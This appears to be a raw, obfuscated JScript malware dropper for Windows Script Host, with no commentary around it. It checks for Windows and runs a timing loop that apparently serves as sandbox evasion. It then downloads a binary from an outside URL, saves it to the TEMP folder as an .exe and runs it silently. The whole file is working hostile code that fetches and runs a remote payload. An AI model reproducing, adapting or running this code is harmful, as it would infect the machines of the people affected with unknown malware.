var v0 = false;
var a = "CreateObject";
var P = function b() {return WScript[a]("WScript.Shell");}(), UO = 11;
var d0 = "MSXML2.XMLHTTP";
var X = 2123213;
var p = 0;
function d(kh){P["Run"](kh, p, p);};
function uI(){return "" + d0;};
function Hx(RO, h){p = p * 1; return RO - h;};
function N(){return a;};
/*@cc_on
  @if (@_win32 || @_win64)
    v0 = true;
  @end
@*/
if (v0)
{
var U = "";
function AZ(){return 22;};
var X0 = 0; var I = 0;
function rk()
{
var QR = new this["Date"]();
var yY = QR["getUTCMilliseconds"]();
WScript["Sleep"](AZ());
var QR = new this["Date"]();
var hO = QR["getUTCMilliseconds"]();
WScript["Sleep"](AZ());
var QR = new this["Date"]();
var PP = QR["getUTCMilliseconds"]();
var X0 = "Tb";
X0 = Hx(hO, yY);
var I = "A";
I = Hx(PP, hO);
U = "open";
return Hx(X0, I);
}
var az = false;
var FF = false;
for (var XQ = p; XQ < AZ() * 1; XQ++){if (rk() != p){
az = true; 
I = "31" + 11 * X0 + I; 
FF = true; 
break;
}}
function Z() {return ((az == true) && (az == FF)) ? 1 : p;};
if (az && Z() && FF){
function t() {return P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jaaIusWE4Y.exe";};
 O = uI();
 Pa = WScript[a](O);
 var F = 1;
 while (F){
try {
Pa[U]("GET", "http://blog.saletron.net/li9soz", false);
Pa["send"]();
nH = "Sleep";
for (;;){WScript[nH](AZ() * 11); if (Pa["readystate"] >= 2 * 2) break;};
F = p;
} catch(o){};
}
function D(u) {var v = (1, 2, 3, 4, 5, u); return v;};
kN = WScript[N()]("ADODB.Stream");
O = kN;
O[U]();
O["type"] = D(1);
O["write"](Pa["ResponseBody"]);
kN["position"] = D(p);
O["Save" + "ToFile"](t(), 2);
kN["c"+"lose"]();
i = t();
d(i);
}
}

